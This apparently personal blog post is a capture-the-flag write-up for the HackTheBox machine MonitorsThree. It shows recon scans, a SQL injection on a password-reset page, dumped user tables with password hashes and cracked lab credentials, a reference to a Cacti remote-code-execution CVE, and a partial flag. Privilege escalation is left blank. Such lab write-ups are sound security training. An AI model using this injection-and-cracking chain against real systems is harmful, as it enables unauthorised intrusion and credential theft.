---
layout: post
title: "HackTheBox: MonitorsThree"
description: A writeup for Hackthebox Cicada
date:   2024-09-19 12:06:31 +0000
image:  '/images/post/monitorsthree.jpg'
tags:   [HackTheBox,htb]
---
## Setup
`mkdir -p ~/ctf/HackTheBox/monitorsthree/scans; cd ~/ctf/HackTheBox/monitorsthree`
IP Address: 10.10.11.30


`echo "10.10.11.30 monitorsthree.htb" | sudo tee -a /etc/hosts`
10.10.11.30 monitorsthree.htb
***
### Enumeration 
![1b72642bca17d8635c49f8d56e7de859.png]({{site.baseurl}}/images/post/1b72642bca17d8635c49f8d56e7de859.png)
`nmap -sC -sV -Pn -p- monitorsthree.htb -oN scans/nmap -vv`
`nmap -sC -sV -p- -T5 --min-rate 2500 -oN scans/nmap_2 monitorsthree.htb`
```
# nmap findings

```

`gobuster dir --no-error -e -x php,html,txt -u http://monitorsthree.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --output scans/gobuster`


[Gobuster Cheatsheet](https://linuxcscom.wordpress.com/gobuster/)
```
# gobuster findings

```

`feroxbuster --url http://monitorsthree.htb -d 2 -x php,html,txt --output scans/feroxbuster`
```
# ferox buster findings

```

`wfuzz -c -u https://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --oF scans/wfuzz_subdomain`
```
#Wfuzz Subdomain Finder 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://monitorsthree.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000246:   302        0 L      0 W        0 Ch        "cacti"       
```

using `'`  in http://monitorsthree.htb/forgot_password.php we find sql error and use Ghauri for SQL injection: 

![135e5b6ec2acf567cee994423c6cd01f.png]({{site.baseurl}}/images/post/135e5b6ec2acf567cee994423c6cd01f.png)

Database: monitorsthree_db
Table: users
[4 entries]
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+
| id | username  | email                       | password                         | name              | position              | dob        | start_date | salary    |                                            
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+                                            
| 2  | admin     | admin@monitorsthree.htb     | 31a181c8372e3afc59dab863430610e8 | Marcus Higgins    | Super User            | 1978-04-25 | 2021-01-12 | 320800.00 |                                            
| 7  | dthompson | mwatson@monitorsthree.htb   | c585d01f2eb3e6e1073e92023088a3dd | Michael Watson    | Website Administrator | 1985-02-15 | 2021-05-10 | 75000.00  |                                            
| 6  | janderson | janderson@monitorsthree.htb | 1e68b6eb86b45f6d92f8f292428f77ac | Jennifer Anderson | Network Engineer      | 1990-07-30 | 2021-06-20 | 68000.00  |                                            
| 5  | mwatson   | dthompson@monitorsthree.htb | 633b683cc128fe244b00f176c8a950f5 | David Thompson    | Database Manager      | 1982-11-23 | 2022-09-15 | 83000.00  |                                            
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+                                            

[22:50:02] [INFO] table 'monitorsthree_db.users' dumped to CSV file '/home/w3rew01f/.ghauri/monitorsthree.htb/dump/monitorsthree_db/users.csv'



Using hashcat hashid and rockyou list we crack the hash:
![96cbaa7dc84d9ec21c202cebfb397f2f.png]({{site.baseurl}}/images/post/96cbaa7dc84d9ec21c202cebfb397f2f.png)

`admin:greencacti2001`

Nothing useful in `http://monitorsthree.htb/admin` and `http://monitorsthree.htb/login`

The version of cacti is vulnerable to [CVE-2024-25641](https://www.rapid7.com/db/modules/exploit/multi/http/cacti_package_import_rce/)

![9f60245f96b99a6ee4f5393cf58f4847.png]({{site.baseurl}}/images/post/9f60245f96b99a6ee4f5393cf58f4847.png)

we get a shell but no access to marcus 

using linpeas we find a database 
![60662f54ca3a5036f1555b8e13eae8ff.png]({{site.baseurl}}/images/post/60662f54ca3a5036f1555b8e13eae8ff.png)
Active 3306 port here 
![23ee3a00966866b1073ba303489c6e0e.png]({{site.baseurl}}/images/post/23ee3a00966866b1073ba303489c6e0e.png)



+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

Using hashcat we get the password for marcus
![4b6eb0c5fb608ca27e0d603cfe9ba554.png]({{site.baseurl}}/images/post/4b6eb0c5fb608ca27e0d603cfe9ba554.png)

`marcus:12345678910`
Succesfull Login 
![d13817ed04784ca5bedde6b5c6dbbbb7.png]({{site.baseurl}}/images/post/d13817ed04784ca5bedde6b5c6dbbbb7.png)

***
# user flag
Location: /home/marcus | Flag: 37b##################################

#### Privilege Escalation



***
# root flag
Location:  | Flag: 
```

```